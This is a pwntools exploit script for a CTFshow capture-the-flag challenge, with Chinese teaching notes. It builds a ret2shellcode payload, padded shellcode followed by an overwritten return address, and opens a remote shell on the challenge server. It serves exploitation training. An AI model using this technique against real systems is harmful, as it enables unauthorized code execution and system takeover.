from pwn import *

context(arch = 'i386', os = 'linux')

p = remote('pwn.challenge.ctf.show', 28272)

shellcode = asm(shellcraft.sh()).ljust(0x70, b'a')

buf2_addr = 0x804A080

payload = shellcode + p32(buf2_addr)

p.sendlineafter('CTFshow-pwn can u pwn me here!!\n', payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2shellcode - shellcode填充
2. ljust()函数：
   - 将shellcode左对齐，右侧填充到指定长度
   - ljust(0x70, b'a')：填充到0x70字节，用'a'填充
3. 为什么需要填充？
   - 程序可能读取固定长度的输入
   - 填充确保覆盖到返回地址
   - 或者对齐shellcode位置
4. payload结构：
   [shellcode 填充到0x70字节] [buf2_addr]
   - shellcode位于buf2_addr指向的内存
   - 覆盖返回地址为buf2_addr
5. buf2_addr = 0x804A080：
   - 可能是BSS段或其他可执行内存区域
   - 程序将输入复制到该地址
6. 执行流程：
   - 发送payload，shellcode写入buf2_addr
   - 返回地址被覆盖为buf2_addr
   - 函数返回，跳转到shellcode执行
7. 关键点：shellcode填充和固定长度payload构造
"""
